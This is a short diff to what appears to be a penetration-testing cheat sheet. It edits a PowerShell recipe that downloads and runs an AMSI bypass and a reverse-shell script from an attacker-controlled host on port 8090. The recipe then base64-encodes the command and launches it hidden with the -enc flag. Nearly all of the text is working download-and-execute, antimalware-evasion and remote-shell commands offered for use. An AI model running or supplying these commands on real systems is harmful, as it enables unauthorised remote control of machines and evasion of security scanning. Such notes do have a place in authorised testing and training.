@@ -39,7 +39,7 @@ powershell iex (New-Object Net.WebClient).DownloadString('http://<IP>:8090/amsi.
 It is possible to make it a bit easier to get command execution using the following technique, need to be executed in PowerShell:
 
 ```
-$str = 'powershell iex (New-Object Net.WebClient).DownloadString("http://<IP>:8090/amsi.txt"); iex (New-Object Net.WebClient).DownloadString("http://<IP>:8090/Invoke-PowerShellTcp2.ps1")'
+$str = 'iex (New-Object Net.WebClient).DownloadString("http://<IP>:8090/amsi.txt"); iex (New-Object Net.WebClient).DownloadString("http://<IP>:8090/Invoke-PowerShellTcp2.ps1")'
 [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str)) | clip
 powershell.exe -w hidden -enc <BASE64 STRING>
 ```
